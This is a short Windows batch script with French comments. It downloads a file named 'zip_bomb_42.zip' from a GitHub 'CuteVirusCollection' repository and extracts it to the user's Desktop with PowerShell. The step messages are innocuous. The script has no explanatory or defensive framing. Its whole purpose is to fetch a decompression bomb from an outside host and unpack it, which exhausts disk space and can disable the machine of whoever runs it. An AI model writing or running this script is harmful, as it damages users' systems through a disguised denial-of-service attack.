@echo off
setlocal

:: Définition des variables
set "url=https://github.com/MinhasKamal/CuteVirusCollection/raw/refs/heads/master/zip_bomb_42.zip"
set "zipPath=%TEMP%\zip_bomb_42.zip"
set "extractPath=%USERPROFILE%\Desktop\Extracted"

:: Téléchargement du fichier
echo Téléchargement en cours...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%zipPath%')"

:: Création du dossier d'extraction
mkdir "%extractPath%"

:: Décompression avec PowerShell
powershell -Command "Expand-Archive -Path '%zipPath%' -DestinationPath '%extractPath%' -Force"

echo Extraction terminée !
exit
